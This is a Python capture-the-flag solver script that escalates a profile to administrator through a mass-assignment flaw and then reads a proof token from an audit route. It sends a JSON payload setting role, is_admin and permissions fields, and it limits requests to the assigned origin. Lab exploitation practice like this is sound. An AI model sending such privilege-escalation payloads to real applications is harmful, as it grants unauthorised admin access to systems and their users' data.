#!/usr/bin/env python3
"""Promote the assigned profile through its mass-assignment feature and read audit proof."""

from __future__ import annotations

import argparse
from datetime import datetime, timezone
import hashlib
import http.cookiejar
import json
from pathlib import Path
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urljoin, urlsplit
from urllib.request import HTTPCookieProcessor, Request, build_opener

from inspect_target import normalize_url, origin


PROOF_RE = re.compile(r"\bproof_[A-Za-z0-9_-]{12,}\b")
MAX_BODY_BYTES = 2 * 1024 * 1024
PROFILE_UPDATE = {
    "display_name": "Learner",
    "name": "Learner",
    "role": "admin",
    "current_role": "administrator",
    "is_admin": True,
    "isAdmin": True,
    "admin": True,
    "access_level": "administrator",
    "accessLevel": "administrator",
    "permissions": ["admin"],
    "profile": {"role": "admin", "is_admin": True},
}


def request(
    opener,
    url: str,
    allowed_origin: tuple[str, str, int],
    *,
    method: str = "GET",
    body: bytes | None = None,
) -> tuple[int, bytes]:
    normalized = normalize_url(url)
    if origin(normalized) != allowed_origin:
        raise ValueError(f"refusing off-origin URL: {normalized}")
    headers = {
        "User-Agent": "HuntressCTF-Web-Inspector/1.0",
        "Accept": "*/*",
    }
    if body is not None:
        headers["Content-Type"] = "application/json"
    req = Request(normalized, data=body, headers=headers, method=method)
    try:
        with opener.open(req, timeout=10) as response:
            return response.status, response.read(MAX_BODY_BYTES + 1)
    except HTTPError as exc:
        return exc.code, exc.read(MAX_BODY_BYTES + 1)
    except URLError as exc:
        raise RuntimeError(f"request failed: {exc.reason}") from exc


def save_response(output_dir: Path, name: str, status: int, body: bytes) -> dict[str, object]:
    path = output_dir / name
    path.write_bytes(body)
    return {
        "status": status,
        "file": path.name,
        "bytes": len(body),
        "sha256": hashlib.sha256(body).hexdigest(),
    }


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Follow the assigned profile and audit routes to recover the proof."
    )
    parser.add_argument("target", help="absolute target URL from the current attempt")
    parser.add_argument("--output-dir", type=Path, help="directory for response evidence")
    args = parser.parse_args()

    try:
        target = normalize_url(args.target)
        allowed_origin = origin(target)
        host = urlsplit(target).hostname or "target"
        timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
        output_dir = args.output_dir or (
            Path("web-tools/evidence") / f"{host}-mass-assignment-{timestamp}"
        )
        output_dir.mkdir(parents=True, exist_ok=True)

        # Keep the assigned site's session in memory across the update and audit.
        opener = build_opener(HTTPCookieProcessor(http.cookiejar.CookieJar()))
        home_url = normalize_url(urljoin(target, "/"))
        home_status, home_body = request(opener, home_url, allowed_origin)
        clues_url = normalize_url(urljoin(target, "/api/clues"))
        clues_status, clues_body = request(opener, clues_url, allowed_origin)
        if clues_status != 200:
            raise RuntimeError(f"route inventory returned HTTP {clues_status}")
        clues = json.loads(clues_body.decode("utf-8"))
        if not isinstance(clues, dict):
            raise ValueError("route inventory is not a JSON object")
        feature_route = clues.get("feature_route")
        audit_route = clues.get("secondary_route")
        if not all(isinstance(route, str) and route for route in (feature_route, audit_route)):
            raise ValueError("route inventory lacks feature_route or secondary_route")

        feature_url = normalize_url(urljoin(target, feature_route))
        audit_url = normalize_url(urljoin(target, audit_route))
        if origin(feature_url) != allowed_origin or origin(audit_url) != allowed_origin:
            raise ValueError("route inventory points outside the assigned target")

        update_status, update_body = request(
            opener,
            feature_url,
            allowed_origin,
            method="POST",
            body=json.dumps(PROFILE_UPDATE, separators=(",", ":")).encode("utf-8"),
        )
        if update_status < 200 or update_status >= 300:
            raise RuntimeError(
                f"profile update returned HTTP {update_status}: "
                f"{update_body[:500].decode('utf-8', errors='replace')}"
            )
        audit_status, audit_body = request(opener, audit_url, allowed_origin)
        matches = PROOF_RE.findall(audit_body.decode("utf-8", errors="replace"))
        report = {
            "target": target,
            "created_at": datetime.now(timezone.utc).isoformat(),
            "clues": clues,
            "feature_url": feature_url,
            "audit_url": audit_url,
            "responses": {
                "home": save_response(output_dir, "home.body", home_status, home_body),
                "clues": save_response(output_dir, "clues.body", clues_status, clues_body),
                "update": save_response(
                    output_dir, "profile-update.body", update_status, update_body
                ),
                "audit": save_response(output_dir, "audit.body", audit_status, audit_body),
            },
            "proof": matches[-1] if matches else None,
        }
        (output_dir / "report.json").write_text(
            json.dumps(report, indent=2, ensure_ascii=False) + "\n",
            encoding="utf-8",
        )
        if not matches:
            raise RuntimeError(
                f"audit returned HTTP {audit_status} without a proof; "
                f"inspect {output_dir / 'report.json'}"
            )
        print(
            json.dumps(
                {
                    "proof": matches[-1],
                    "report": str(output_dir / "report.json"),
                    "audit_url": audit_url,
                },
                indent=2,
            )
        )
        return 0
    except (
        ValueError,
        RuntimeError,
        OSError,
        UnicodeDecodeError,
        json.JSONDecodeError,
    ) as exc:
        print(json.dumps({"error": str(exc)}), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
